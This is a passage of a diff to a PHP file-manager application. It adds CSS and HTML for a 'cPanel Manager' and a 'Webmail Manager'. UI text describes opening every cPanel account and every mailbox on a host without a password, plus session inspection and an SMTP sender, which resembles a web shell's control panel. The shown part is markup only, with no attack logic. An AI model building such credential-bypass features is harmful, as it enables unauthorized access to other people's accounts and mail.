+        header('Content-Length: '.strlen($file['data']));
+        header('X-Content-Type-Options: nosniff');
+        header('Cache-Control: no-store');
+        echo $file['data'];
+        exit;
+    }
     if($xop==='pma'){
         if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){
             http_response_code(403);echo json_encode(['ok'=>false,'error'=>'Security error.']);exit;
@@ -21053,6 +22668,264 @@ input[type=file]{display:none}
 .pma-live{font-size:10px;padding:2px 8px;border-radius:20px;border:1px solid var(--border);color:var(--t3);background:var(--raised);margin-left:9px}
 
 /* <<PMA-CSS-END>> */
+/* <<CPM-CSS-BEGIN>> */
+/* ══ cPanel Manager — the accounts of a cPanel server, opened as any of them ══
+   The window is built out of the same pieces as phpMyAdmin Manager (.pma-*),
+   so the two read as one family; only the few things that are particular to
+   cPanel accounts are new here. */
+.cpm-mod{width:min(1240px,97vw);height:min(860px,94vh);max-height:94vh;min-height:0}
+.cpm-rail{width:288px}
+.cpm-list .pma-item .t b{max-width:200px}
+.cpm-list .pma-item .t span{max-width:200px}
+.cpm-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;background:#86efac}
+.cpm-dot.off{background:#94a3b8}
+.cpm-search{width:100%;font:inherit;font-size:11.5px;padding:7px 9px;border-radius:8px;border:1px solid var(--border);background:var(--surf);color:var(--t1)}
+.cpm-search:focus{outline:none;border-color:rgba(37,99,235,.5)}
+.cpm-sec{border:1px solid var(--border);border-radius:11px;background:var(--surf);padding:11px 12px;min-width:0}
+.cpm-sec-h{display:flex;align-items:center;gap:7px;font-size:11px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;color:var(--t3);margin-bottom:9px}
+.cpm-sec-h svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+.cpm-sec-h .r{margin-left:auto;font-size:10px;font-weight:600;text-transform:none;letter-spacing:0;color:var(--t3)}
+.cpm-open{display:flex;gap:7px;flex-wrap:wrap}
+.cpm-open .btn{display:inline-flex;align-items:center;gap:6px}
+.cpm-open .btn svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+.cpm-open .btn[disabled]{opacity:.5;cursor:not-allowed}
+.cpm-sso{margin-top:10px;border:1px solid rgba(134,239,172,.28);background:rgba(134,239,172,.06);border-radius:11px;padding:10px 12px}
+.cpm-sso.hide{display:none}
+.cpm-sso .h{display:flex;align-items:center;gap:7px;font-size:11.5px;font-weight:700;color:#86efac;margin-bottom:7px}
+.cpm-sso .h svg{width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+.cpm-sso .link{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10.5px;color:var(--t1);word-break:break-all;background:var(--raised);border:1px solid var(--border);border-radius:8px;padding:7px 9px}
+.cpm-sso .acts{display:flex;gap:7px;margin-top:8px;align-items:center;flex-wrap:wrap}
+.cpm-sso .txt{font-size:10.5px;color:var(--t3);margin-top:7px;line-height:1.55}
+.cpm-bar{height:6px;border-radius:6px;background:var(--raised);border:1px solid var(--border);overflow:hidden;margin:6px 0 3px}
+.cpm-bar i{display:block;height:100%;background:linear-gradient(90deg,#3b82f6,#60a5fa)}
+.cpm-bar.warn i{background:linear-gradient(90deg,#f59e0b,#fbbf24)}
+.cpm-bar.bad i{background:linear-gradient(90deg,#dc2626,#f87171)}
+.cpm-kv{display:grid;grid-template-columns:104px minmax(0,1fr);gap:3px 8px;font-size:11.5px}
+.cpm-kv .k{color:var(--t3)}
+.cpm-kv .v{color:var(--t1);overflow-wrap:anywhere;min-width:0}
+.cpm-kv .v.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10.5px;color:var(--t2)}
+.cpm-pill{font-size:10px;padding:2px 8px;border-radius:20px;border:1px solid var(--border);background:var(--raised);color:var(--t2);white-space:nowrap}
+.cpm-pill.ok{border-color:rgba(134,239,172,.32);background:rgba(134,239,172,.09);color:#86efac}
+.cpm-pill.warn{border-color:rgba(252,211,77,.3);background:rgba(252,211,77,.08);color:#fcd34d}
+.cpm-pill.acc{border-color:rgba(37,99,235,.4);background:rgba(37,99,235,.13);color:#bfdbfe}
+.cpm-inp,.cpm-sel{width:100%;font:inherit;font-size:11.5px;padding:7px 9px;border-radius:8px;border:1px solid var(--border);background:var(--raised);color:var(--t1);box-sizing:border-box}
+.cpm-inp:focus,.cpm-sel:focus{outline:none;border-color:rgba(37,99,235,.5)}
+.cpm-lab{display:block;font-size:10.5px;color:var(--t3);font-weight:600;margin:8px 0 4px}
+.cpm-row{display:flex;gap:7px;align-items:center;flex-wrap:wrap}
+.cpm-msg{font-size:11px;color:var(--t3);margin-top:8px;line-height:1.55;min-height:14px}
+.cpm-msg.bad{color:#fca5a5}
+.cpm-msg.good{color:#86efac}
+.cpm-danger{border-color:rgba(248,113,113,.35)!important;color:#fca5a5!important}
+.cpm-mark{display:flex;gap:8px;align-items:center;font-size:11px;padding:3px 0;color:var(--t3)}
+.cpm-mark .p{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10.5px;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.cpm-mark .s{flex-shrink:0;font-weight:700;width:14px;text-align:center}
+.cpm-mark.yes .s{color:#86efac}
+.cpm-mark.yes .p{color:var(--t2)}
+.cpm-mark.no .s{color:#94a3b8}
+.cpm-reasons{display:flex;flex-direction:column;gap:3px;margin-top:8px;font-size:10.5px;color:var(--t3)}
+.cpm-reasons .r{display:flex;gap:6px;align-items:baseline}
+.cpm-reasons .r:before{content:"·";color:#94a3b8}
+.cpm-create{display:none}
+.cpm-create.on{display:block}
+@media (max-width:900px){
+  .cpm-mod{width:97vw;height:94vh}
+  .pma-wrap{flex-direction:column}
+  .cpm-rail{width:auto;border-right:none;border-bottom:1px solid var(--border);max-height:210px}
+  .cpm-list{padding-bottom:6px}
+}
+/* <<CPM-CSS-END>> */
+/* <<WM2-CSS-BEGIN>> */
+/* ══ Webmail Manager — every mailbox on the host, opened without a sign-in ══
+   The window is read in four steps, left to right and top to bottom, in the
+   order the work is done:
+     1. the rail        — which mailbox, grouped by where the mail was found
+     2. the head        — what that mailbox is and what may be done with it
+     3. the folders     — which folder of it, with its counts
+     4. list → reading  — the messages of that folder, then one of them
+   Nothing is hidden behind a sign-in, and nothing is a dead end: a mailbox
+   that cannot be read says why, in the same place where it is listed. */
+.wm-mod{width:min(1440px,98vw);height:min(900px,94vh);max-height:94vh;min-height:0;display:flex;flex-direction:column}
+.wm-body{display:flex;flex:1;min-height:0;overflow:hidden}
+
+/* 1 — the rail */
+.wm-rail{width:300px;flex-shrink:0;border-right:1px solid var(--border);background:var(--raised);display:flex;flex-direction:column;min-height:0}
+.wm-rail-head{padding:10px 12px 7px;display:flex;flex-direction:column;gap:7px;border-bottom:1px solid var(--border)}
+.wm-rail-lab{display:flex;align-items:center;gap:6px;font-size:10px;letter-spacing:.8px;text-transform:uppercase;color:var(--t3);font-weight:700}
+.wm-rail-lab svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+.wm-search{width:100%;font:inherit;font-size:11.5px;padding:6px 9px;border-radius:8px;border:1px solid var(--border);background:var(--surf);color:var(--t1);box-sizing:border-box}
+.wm-search:focus{outline:none;border-color:rgba(37,99,235,.5)}
+#wmList{overflow:auto;padding:8px;display:flex;flex-direction:column;gap:3px;flex:1;min-height:0}
+.wm-group{display:flex;flex-direction:column;gap:1px;padding:9px 4px 3px;border-top:1px solid var(--border);margin-top:4px}
+.wm-group:first-child{border-top:none;margin-top:0;padding-top:2px}
+.wm-group span{font-size:9.5px;letter-spacing:.7px;text-transform:uppercase;color:var(--t3);font-weight:700}
+.wm-group i{font-size:9.5px;color:var(--t3);opacity:.75;font-style:normal;line-height:1.35}
+/* the mailbox row carries its own look: it does not borrow another tool's row,
+   so a change made for phpMyAdmin can never quietly restyle the mail */
+.wm-item{display:flex;align-items:center;gap:9px;padding:8px 9px;border-radius:9px;
+  border:1px solid transparent;background:transparent;color:var(--t2);cursor:pointer;
+  text-align:left;width:100%;font:inherit}
+.wm-item:hover{background:var(--hov);color:var(--t1)}
+.wm-item.is-on{background:rgba(37,99,235,.14);border-color:rgba(37,99,235,.35);color:#bfdbfe}
+.wm-item .t{display:flex;flex-direction:column;gap:1px;min-width:0}
+.wm-item .t b{font-size:12px;font-weight:650;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:190px}
+.wm-item .t span{font-size:10px;color:var(--t3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:190px}
+.wm-item.is-on .t span{color:#93b4e8}
+.wm-item-off .t b{color:var(--t3)}
+.wm-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;background:#86efac;box-shadow:0 0 0 3px rgba(134,239,172,.12)}
+.wm-dot.off{background:#64748b;box-shadow:none}
+.wm-foot{border-top:1px solid var(--border);padding:9px 12px 11px;display:flex;flex-direction:column;gap:5px;max-height:34%;overflow:auto}
+.wm-foot-line{font-size:10.5px;color:var(--t3)}
+.wm-foot-line b{color:var(--t2);font-weight:700}
+.wm-foot-note{font-size:10px;color:var(--t3);line-height:1.5;opacity:.9}
+
+/* 2 — the head of the chosen mailbox + 3 — its folders */
+.wm-main{flex:1;min-width:0;min-height:0;display:flex;flex-direction:column}
+.wm-head{padding:11px 14px 10px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:8px;flex-shrink:0}
+.wm-head-row{display:flex;align-items:flex-start;gap:10px;flex-wrap:wrap}
+.wm-head-id{display:flex;flex-direction:column;gap:2px;min-width:0;flex:1}
+.wm-head-id b{font-size:14px;font-weight:700;color:var(--t1);overflow-wrap:anywhere}
+.wm-head-id span{font-size:10.5px;color:var(--t3);overflow-wrap:anywhere;line-height:1.45}
+.wm-head-idle{font-size:11.5px;color:var(--t3);line-height:1.6}
+.wm-tools{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.wm-tools .btn{display:inline-flex;align-items:center;gap:6px}
+.wm-tools .btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+#wmFolders{display:flex;gap:5px;flex-wrap:wrap;align-items:center}
+.wm-folder{display:inline-flex;align-items:center;gap:6px;font:inherit;font-size:11.5px;padding:5px 10px;border-radius:8px;border:1px solid var(--border);background:var(--surf);color:var(--t2);cursor:pointer}
+.wm-folder:hover{background:var(--hov);color:var(--t1)}
+.wm-folder.is-on{background:rgba(37,99,235,.16);border-color:rgba(37,99,235,.4);color:#bfdbfe}
+.wm-folder i{font-style:normal;font-size:10px;color:var(--t3);font-weight:700}
+.wm-folder.is-on i{color:#93b4e8}
+.wm-folder u{text-decoration:none;font-size:9px;font-weight:700;letter-spacing:.2px;padding:1px 5px;border-radius:20px;background:rgba(134,239,172,.14);color:#86efac}
+
+/* 4 — the list, then the message */
+.wm-split{display:flex;flex:1;min-height:0;overflow:hidden}
+.wm-list-col{width:382px;flex-shrink:0;border-right:1px solid var(--border);display:flex;flex-direction:column;min-height:0;background:var(--surf)}
+.wm-list-top{display:flex;align-items:center;gap:7px;padding:8px 10px;border-bottom:1px solid var(--border);flex-shrink:0}
+.wm-list-top b{font-size:11px;font-weight:700;color:var(--t2)}
+.wm-list-top .wm-search{flex:1;min-width:0}
+.wm-list-top .btn{flex-shrink:0}
+#wmMsgs{flex:1;overflow:auto;min-height:0}
+.wm-row{display:flex;gap:8px;align-items:flex-start;padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.045);cursor:pointer}
+.wm-row:hover{background:var(--hov)}
+.wm-row.is-on{background:rgba(37,99,235,.13);box-shadow:inset 2px 0 0 rgba(96,165,250,.9)}
+.wm-row.unread .wm-row-sub{color:var(--t1);font-weight:700}
+.wm-row.unread .wm-row-top b{color:#fff}
+.wm-check{display:flex;align-items:center;padding-top:2px;flex-shrink:0}
+.wm-check input{margin:0;width:13px;height:13px;accent-color:#2563eb;cursor:pointer}
+.wm-row-main{min-width:0;flex:1;display:flex;flex-direction:column;gap:2px}
+.wm-row-top{display:flex;gap:8px;align-items:baseline}
+.wm-row-top b{font-size:11.5px;font-weight:650;color:var(--t2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1;min-width:0}
+.wm-row-top span{font-size:10px;color:var(--t3);flex-shrink:0;font-variant-numeric:tabular-nums}
+.wm-row-sub{font-size:11.5px;color:var(--t2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.35}
+.wm-row-end{display:flex;gap:6px;align-items:center;font-size:9.5px;color:var(--t3)}
+.wm-clip{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.wm-bulk{display:flex;align-items:center;gap:8px;padding:7px 10px;border-top:1px solid var(--border);flex-shrink:0;background:var(--raised)}
+.wm-bulk-n{font-size:10.5px;color:var(--t3);flex:1}
+.wm-bulk .btn{display:inline-flex;align-items:center;gap:5px}
+.wm-bulk .btn svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+.wm-bulk .btn[disabled]{opacity:.45;cursor:not-allowed}
+
+#wmRead{flex:1;min-width:0;min-height:0;display:flex;flex-direction:column;overflow:hidden;background:var(--surf)}
+.wm-read-head{padding:11px 14px 8px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:5px;flex-shrink:0}
+.wm-read-subject{font-size:14px;font-weight:700;color:var(--t1);line-height:1.35;overflow-wrap:anywhere}
+.wm-read-meta{display:flex;gap:8px;align-items:baseline;flex-wrap:wrap}
+.wm-read-meta b{font-size:11.5px;color:var(--t1);font-weight:650}
+.wm-read-meta span{font-size:10.5px;color:var(--t3);overflow-wrap:anywhere}
+.wm-read-meta2{display:flex;gap:12px;flex-wrap:wrap;font-size:10px;color:var(--t3)}
+.wm-read-meta2 span{overflow-wrap:anywhere}
+.wm-read-acts{display:flex;gap:6px;flex-wrap:wrap;margin-top:3px}
+.wm-read-acts .btn{display:inline-flex;align-items:center;gap:5px}
+.wm-read-acts .btn svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+.wm-read-acts .btn[disabled]{opacity:.45;cursor:not-allowed}
+.wm-tabs{display:flex;gap:2px;padding:0 14px;border-bottom:1px solid var(--border);flex-shrink:0}
+.wm-tab{font:inherit;font-size:10.5px;font-weight:650;padding:7px 10px;border:none;background:none;color:var(--t3);cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}
+.wm-tab:hover{color:var(--t2)}
+.wm-tab.is-on{color:#bfdbfe;border-bottom-color:#3b82f6}
+.wm-read-body{flex:1;min-height:0;display:flex;padding:10px 12px;overflow:hidden}
+.wm-frame{flex:1;width:100%;border:1px solid var(--border);border-radius:9px;background:#fff}
+.wm-pre{margin:0;flex:1;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11.5px;line-height:1.6;color:var(--t1);background:var(--raised);border:1px solid var(--border);border-radius:9px;padding:12px}
+.wm-info{flex:1;overflow:auto;display:flex;flex-direction:column;gap:2px}
+.wm-info .pma-line .k{min-width:88px;max-width:88px}
+.wm-info .mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10.5px;color:var(--t2);overflow-wrap:anywhere}
+.wm-atts{border-top:1px solid var(--border);padding:8px 12px 10px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;flex-shrink:0;max-height:33%;overflow:auto}
+.wm-atts-h{width:100%;font-size:9.5px;letter-spacing:.6px;text-transform:uppercase;color:var(--t3);font-weight:700}
+.wm-att{display:inline-flex;align-items:center;gap:6px;font-size:10.5px;color:var(--t2);text-decoration:none;border:1px solid var(--border);background:var(--raised);border-radius:8px;padding:5px 9px;max-width:100%}
+.wm-att:hover{border-color:rgba(37,99,235,.45);color:var(--t1)}
+.wm-att svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
+.wm-att span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:190px}
+.wm-att i{font-style:normal;font-size:9.5px;color:var(--t3)}
+.wm-read-idle{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;color:var(--t3);text-align:center;padding:30px}
+.wm-read-idle svg{width:34px;height:34px;stroke:currentColor;fill:none;stroke-width:1.4;opacity:.5}
+.wm-read-idle b{font-size:12.5px;color:var(--t2)}
+.wm-read-idle span{font-size:11px;max-width:340px;line-height:1.6}
+.wm-empty{padding:18px 14px;font-size:11px;color:var(--t3);line-height:1.6}
+.wm-empty.bad{color:#fca5a5}
+.wm-status{font-size:10.5px;color:var(--t3);padding:0 14px 8px;min-height:14px}
+.wm-status.good{color:#86efac}
+.wm-status.bad{color:#fca5a5}
+
+/* the composer — From first, then who, then what, then the words, then send */
+.wm-co{width:min(940px,96vw);height:min(780px,93vh);max-height:93vh;min-height:0;display:flex;flex-direction:column}
+.wm-co-body{flex:1;min-height:0;display:flex;flex-direction:column;padding:12px 14px 0;gap:0;overflow:hidden}
+.wm-co-row{display:none;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border)}
+.wm-co-row.on,.wm-co-row#wmCoToRow,.wm-co-row#wmCoSubjRow,.wm-co-row#wmCoFromRow{display:flex}
+.wm-co-row label{font-size:10px;letter-spacing:.6px;text-transform:uppercase;color:var(--t3);font-weight:700;width:52px;flex-shrink:0}
+.wm-co-row input{flex:1;min-width:0;font:inherit;font-size:11.5px;padding:5px 0;border:none;background:none;color:var(--t1)}
+.wm-co-row input:focus{outline:none}
+.wm-co-row .who{font-size:11.5px;color:var(--t1);padding:5px 0;display:flex;align-items:center;gap:7px}
+.wm-co-row .who svg{width:12px;height:12px;stroke:#86efac;fill:none;stroke-width:2.2}
+.wm-co-mini{font:inherit;font-size:10px;padding:2px 7px;border-radius:6px;border:1px solid var(--border);background:var(--raised);color:var(--t3);cursor:pointer;flex-shrink:0}
+.wm-co-mini:hover{color:var(--t1);border-color:rgba(37,99,235,.45)}
+.wm-co-mini.is-on{color:#bfdbfe;border-color:rgba(37,99,235,.45);background:rgba(37,99,235,.14)}
+.wm-co-tools{display:flex;gap:2px;align-items:center;flex-wrap:wrap;padding:7px 0;border-bottom:1px solid var(--border);flex-shrink:0}
+.wm-co-tools .sep{width:1px;height:16px;background:var(--border);margin:0 4px}
+.wm-tb{display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;border-radius:7px;border:1px solid transparent;background:none;color:var(--t2);cursor:pointer}
+.wm-tb:hover{background:var(--hov);color:var(--t1)}
+.wm-tb svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+.wm-tb b{font-size:12px;font-weight:800;line-height:1}
+.wm-tb em{font-size:11px;font-style:italic;font-weight:700}
+.wm-co-edit{flex:1;min-height:0;display:flex;flex-direction:column;padding:8px 0 0}
+#wmCoEditorWrap{flex:1;min-height:0;display:flex;flex-direction:column}
+#wmCoBody{flex:1;min-height:120px;overflow:auto;border:1px solid var(--border);border-radius:9px;background:var(--raised);color:var(--t1);padding:12px 13px;font-size:12.5px;line-height:1.62;outline:none}
+#wmCoBody:focus{border-color:rgba(37,99,235,.5)}
+#wmCoBody blockquote{margin:0;padding-left:12px;border-left:2px solid var(--border);color:var(--t3)}
+#wmCoBody a{color:#93b4e8}
+#wmCoSource{display:none;flex:1;min-height:120px;width:100%;box-sizing:border-box;resize:none;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11px;line-height:1.6;border:1px solid var(--border);border-radius:9px;background:var(--raised);color:var(--t1);padding:11px}
+.wm-co-atts{display:flex;flex-wrap:wrap;gap:6px;padding:7px 0 0;flex-shrink:0}
+.wm-co-att{display:inline-flex;align-items:center;gap:6px;font-size:10.5px;color:var(--t2);border:1px solid var(--border);background:var(--raised);border-radius:8px;padding:4px 6px 4px 9px;max-width:100%}
+.wm-co-att b{font-weight:650;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:220px}
+.wm-co-att i{font-style:normal;color:var(--t3);font-size:9.5px}
+.wm-co-att button{display:grid;place-items:center;width:16px;height:16px;border:none;background:none;color:var(--t3);cursor:pointer;border-radius:4px}
+.wm-co-att button:hover{background:var(--hov);color:#fca5a5}
+.wm-co-att svg{width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2.4}
+.wm-co-foot{display:flex;align-items:center;gap:8px;padding:9px 14px 12px;border-top:1px solid var(--border);flex-shrink:0;margin-top:8px}
+.wm-co-foot .btn{display:inline-flex;align-items:center;gap:6px}
+.wm-co-foot .btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.wm-co-status{flex:1;font-size:10.5px;color:var(--t3);line-height:1.45;overflow-wrap:anywhere}
+.wm-co-status.good{color:#86efac}
+.wm-co-status.bad{color:#fca5a5}
+.wm-co-file{display:none}
+
+/* narrower screens: the same order, folded — rail on top, message below the
+   list, and the list scrolls on its own instead of squeezing the reading */
+@media (max-width:1180px){
+  .wm-rail{width:248px}
+  .wm-list-col{width:320px}
+}
+@media (max-width:900px){
+  .wm-mod{width:98vw;height:95vh}
+  .wm-body{flex-direction:column}
+  .wm-rail{width:auto;max-height:172px;border-right:none;border-bottom:1px solid var(--border)}
+  #wmList{flex-direction:column}
+  .wm-foot{display:none}
+  .wm-split{flex-direction:column}
+  .wm-list-col{width:auto;max-height:46%;border-right:none;border-bottom:1px solid var(--border)}
+  #wmRead{min-height:0;flex:1}
+  .wm-head{padding:9px 11px 8px}
+  .wm-co{width:98vw;height:95vh}
+}
+/* <<WM2-CSS-END>> */
+
 @keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
 .mod-head{display:flex;align-items:center;gap:9px;padding:10px 14px;border-bottom:1px solid var(--border);background:var(--raised);flex-shrink:0}
 .mod-icon{width:24px;height:24px;border-radius:7px;display:flex;align-items:center;justify-content:center;background:rgba(133,137,140,.15);flex-shrink:0}
@@ -22223,8 +24096,12 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <?php if(fm_can('inspector')):?>
       <button class="sb-item" id="sessBtn" title="Inspect, extend or revoke real login sessions (WordPress / Joomla)"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><path d="M12 15v2"/></svg>Session Inspector</button>
       <?php endif;?>
-      <button class="sb-item" id="cpanelBtn"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg>cPanel Manager</button>
-      <button class="sb-item" id="webmailBtn"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>Webmail Manager</button>
+      <?php if(!empty($_SESSION['auth'])&&fm_can('cpm')):?>
+      <button class="sb-item" id="cpanelBtn" title="Find the cPanel server, every account on it, and open any of them signed in — no password typed anywhere"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg>cPanel Manager</button>
+      <?php endif;?>
+      <?php if(!empty($_SESSION['auth'])&&fm_can('cms')):?>
+      <button class="sb-item" id="webmailBtn" title="Every mailbox on this host — WordPress, Joomla, mail folders, mail servers and cPanel accounts — opened without a sign-in"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>Webmail Manager</button>
+      <?php endif;?>
        <button class="sb-item" id="smtpSenderBtn"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/><path d="M16 17h.01"/></svg>SMTP Sender</button>
       <button class="sb-item" id="sqlBtn"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>SQL Manager</button>
       <button class="sb-item" id="wpAutomationBtn"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/><circle cx="12" cy="12" r="3"/></svg>WordPress Automation</button>
@@ -23336,90 +25213,320 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 </div>
 
 <!-- CPANEL MANAGER MODAL -->
-<div class="mod-ov" id="cpanelOv">
-  <div class="mod mod-lg">
+<div class="mod-ov" id="cpmOv">
+  <div class="mod pma-mod cpm-mod">
     <div class="mod-head">
       <div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg></div>
       <span class="mod-title">cPanel Manager</span>
-      <button class="btn btn-icon btn-g" id="cpanelClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+      <span class="pma-live" id="cpmServer">looking for cPanel…</span>
+      <button type="button" class="btn btn-g" id="cpmRefresh" style="margin-left:auto">
+        <svg viewBox="0 0 24 24"><path d="M21 12a9 9 0 1 1-3-6.7"/><path d="M21 4v5h-5"/></svg>Read again
+      </button>
+      <button type="button" class="btn btn-g" id="cpmAccessBtn" title="The address and the one sign-in this tool needs when it does not run on the cPanel server itself">
+        <svg viewBox="0 0 24 24"><path d="M21 2l-2 2"/><path d="M15.5 8.5l-8 8L3 18l1.5-4.5 8-8a2.1 2.1 0 0 1 3 3z"/></svg>Access
+      </button>
+      <button type="button" class="btn btn-icon btn-g" id="cpmClose" title="Close"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
     </div>
-    <div style="display:flex;gap:4px;padding:0 20px;border-bottom:1px solid var(--b2)">
-      <button class="cpanel-tab-btn cpanel-tab-active" data-tab="accounts" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #85898C;color:#85898C;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Accounts</button>
-      <button class="cpanel-tab-btn" data-tab="connect" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--t3);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Connection</button>
-    </div>
-    <div class="mod-body" id="cpanelAccountsBody" style="padding:0"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
-    <div class="mod-body" id="cpanelConnBody" style="display:none"></div>
-  </div>
-</div>
+    <div class="pma-wrap">
+      <aside class="pma-rail cpm-rail">
+        <div class="pma-rail-lab">Accounts <span id="cpmCount"></span></div>
+        <div style="padding:0 8px 6px"><input type="text" class="cpm-search" id="cpmSearch" placeholder="Filter by account or domain" autocomplete="off" spellcheck="false"></div>
+        <div class="pma-list cpm-list" id="cpmList"></div>
+        <div class="pma-empty" id="cpmEmpty" style="display:none">No account could be read.</div>
+        <div class="pma-add">
+          <button type="button" class="btn btn-g" id="cpmNewBtn">
+            <svg viewBox="0 0 24 24"><path d="M12 5v14"/><path d="M5 12h14"/></svg>New account
+          </button>
+          <div class="pma-note" id="cpmRailNote">Every account of this server is listed above. One press opens it signed in — nothing is typed, because the server signs its own session.</div>
+        </div>
+      </aside>
+      <section class="pma-pane" id="cpmPane">
+        <div class="pma-placeholder" id="cpmPlaceholder">
+          <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg>
+          <b>Reading this server</b>
+          <span>cPanel is looked for where it lives: its folders, its account files, its web server on the ports it uses, and the API of WHM. Then every account is listed on the left, and any of them can be opened signed in with one press.</span>
+        </div>
 
-<!-- CPANEL CREATE ACCOUNT MODAL -->
-<div class="mod-ov" id="cpanelCreateOv">
-  <div class="mod mod-sm">
-    <div class="mod-head">
-      <div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
-      <span class="mod-title">New cPanel Account</span>
-      <button class="btn btn-icon btn-g" id="cpanelCreateClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
-    </div>
-    <div class="mod-body">
-      <div id="cpanelCreateFeedback"></div>
-      <label class="lbl">Username</label>
-      <input type="text" id="cpNewUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="e.g. johndoe">
-      <label class="lbl">Domain</label>
